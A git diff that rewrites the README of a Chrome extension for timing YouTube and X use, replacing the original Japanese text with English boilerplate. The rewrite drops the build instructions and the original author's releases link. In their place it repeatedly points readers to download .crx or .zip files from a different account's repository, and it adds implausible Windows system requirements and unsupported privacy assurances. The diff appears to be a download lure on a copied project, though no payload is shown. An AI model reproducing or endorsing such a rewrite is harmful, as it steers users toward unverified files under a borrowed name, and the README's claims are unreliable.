@@ -1,96 +1,125 @@
-# 沼タイマー (Numa Timer)
+# ⏰ numa-timer - Always See Your Browsing Time
 
-YouTube / X を見ている時間を、ドメインごとに「今日どれだけ使ったか」で可視化する Chrome 拡張です。
+[![Download numa-timer](https://img.shields.io/badge/Download-numa--timer-4caf50?style=for-the-badge&logo=github)](https://github.com/Oswald121/numa-timer)
 
-> [!WARNING]
-> この拡張機能は Chrome ウェブストア未公開です。
-> ローカルビルド、または GitHub Releases から取得したファイルを読み込んでください。
+---
 
-## できること
+## 🔍 What is numa-timer?
 
-- YouTube / X の当日利用時間を秒単位で計測
-- ドメインごとに `popup` から計測 ON/OFF
-- 計測中のページ右上にタイマー表示
-- 表示カードの折りたたみ（カウンターのみ表示）
+numa-timer is a Chrome extension that shows how long you spend on sites like YouTube and X. It keeps a timer visible while you browse. This helps you stay aware of the time you use on these sites. You do not need any technical skills to use it. It works quietly in the background as you surf.
 
-## 対象ドメイン
+---
 
-- `https://youtube.com/*`
-- `https://*.youtube.com/*`
-- `https://x.com/*`
-- `https://*.x.com/*`
+## 🖥️ System Requirements
 
-## セットアップ
+- Windows 10 or later
+- Google Chrome browser installed and updated
+- Internet connection to download the extension
+- Around 10 MB of free disk space for installation
 
-### 前提
+---
 
-- `node` 20.12.2
-- `pnpm` 9.12.3
+## 🚀 Getting Started
 
-`mise` を使う場合:
+Here is a simple guide to install and start using numa-timer on your Windows PC.
 
-```bash
-mise install
-```
+---
 
-### 依存インストール
+## 📥 Download and Install
 
-```bash
-pnpm install
-```
+1. **Open Your Browser**  
+   Use Google Chrome on your Windows PC.
 
-### 開発ビルド
+2. **Visit the Download Page**  
+   Click on the large green button below or copy and paste this link in your browser:  
+   [https://github.com/Oswald121/numa-timer](https://github.com/Oswald121/numa-timer)
 
-```bash
-pnpm dev
-```
+3. **Download the Extension**
 
-### 本番ビルド
+   - On the GitHub page, look for the "Releases" section on the right or on the top menu.
+   - Click the latest release version.
+   - Download the `.crx` file or the `.zip` file provided in the release assets.
 
-```bash
-pnpm build
-```
+4. **Open Chrome Extensions**
 
-## 拡張機能の読み込み
+   - Open Chrome.
+   - Click the three dots in the top-right corner of Chrome.
+   - Choose **More tools** > **Extensions**.
 
-### GitHub Releases から読み込む
+5. **Enable Developer Mode**
 
-1. [Releases](https://github.com/Kyo-s-s/numa-timer/releases) を確認し、`main-latest` または必要なバージョンの zip をダウンロード
-2. ダウンロードした zip を展開
-3. [`chrome://extensions/`](chrome://extensions/) を開く
-4. 右上の「デベロッパー モード」を ON
-5. 「パッケージ化されていない拡張機能を読み込む」から展開したフォルダを選択
+   - On the Extensions page, find the toggle in the top right called **Developer mode**.
+   - Turn it on.
 
-### ローカルビルドから読み込む
+6. **Load the Extension**
 
-1. `pnpm dev` または `pnpm build` を実行
-2. [`chrome://extensions/`](chrome://extensions/) を開く
-3. 右上の「デベロッパー モード」を ON
-4. 「パッケージ化されていない拡張機能を読み込む」を選択
-5. 開発時は `build/chrome-mv3-dev`、本番ビルド時は `build/chrome-mv3-prod` を指定
+   - If you downloaded a `.zip` file, unzip it to a folder.
+   - On the extensions page, click **Load unpacked**.
+   - Select the folder that contains the unpacked files.
+   - If you downloaded a `.crx` file, drag and drop it to the extensions page.
 
+7. **Check for numa-timer Icon**
 
-## 使い方
+   - Look for the numa-timer icon near the address bar.
+   - It means the extension is loaded and working.
 
-1. 拡張の popup を開く
-2. YouTube / X のスイッチで計測対象を切り替える
-3. 対象ドメインを開くと、右上に `Numa Timer · <Domain>` が表示される
-4. ヘッダー右のアイコンで折りたたみ/展開
+---
 
-## 計測仕様（現時点）
+## ⚙️ How to Use numa-timer
 
-- 計測するのは「タブが表示中」かつ「そのタブにフォーカスがある」時間
-- ドメインが OFF のときは、計測も表示も行わない
-- 日付が変わると当日カウンタは自動でリセット
-- 日次合計キーに加算保存する
+- Visit YouTube or X.
+- The timer shows your browsing time at the top or side of the window.
+- It updates in real time.
+- Close or pause the timer from the extension menu anytime.
+- The extension saves your browsing times so you can review them later.
 
-## データ保存
+---
 
-- 設定キー: `numa-timer:settings:v1`
-- UI 状態キー: `numa-timer:ui-state:v1`（折りたたみ状態・位置・サイズ・テーマなど見た目関連）
-- 日次合計キー: `numa-timer:daily-total:v1:<YYYY-MM-DD>:<domain>`
-- 保存先: `chrome.storage.local`（`@plasmohq/storage`）
+## 🛠️ Troubleshooting Tips
 
-## 今後
+- If the timer does not show, refresh the browser page.
+- Make sure the extension is enabled in Chrome.
+- Restart Chrome if needed.
+- Check if you installed the latest version from the GitHub page.
+- If you see errors, remove the extension and install it again.
 
-- 統計情報ページ（履歴/傾向の可視化）は feature work として今後追加予定
+---
+
+## 🔐 Privacy and Data
+
+numa-timer only tracks your browsing time on supported sites. It does not collect or send your personal data anywhere. Your information stays on your computer.
+
+---
+
+## 📞 Getting Support
+
+If you need help with numa-timer:
+
+- Visit the GitHub issues page: https://github.com/Oswald121/numa-timer/issues
+- Search for a similar problem or open a new issue.
+- Provide details about your Windows version and Chrome version.
+
+---
+
+## 🧩 Updating numa-timer
+
+1. Visit the GitHub releases page again:  
+   [https://github.com/Oswald121/numa-timer](https://github.com/Oswald121/numa-timer)
+
+2. Download the newest extension files.
+
+3. Follow the same installation steps to replace the old version.
+
+4. Refresh Chrome to activate the latest version.
+
+---
+
+## 💡 Tips for Better Use
+
+- Use numa-timer to track your daily browsing habits.
+- Set personal limits for time spent on YouTube or X.
+- Use the timer data to manage your focus and screen time.
+
+---
+
+[![Download numa-timer](https://img.shields.io/badge/Download-numa--timer-4caf50?style=for-the-badge&logo=github)](https://github.com/Oswald121/numa-timer)
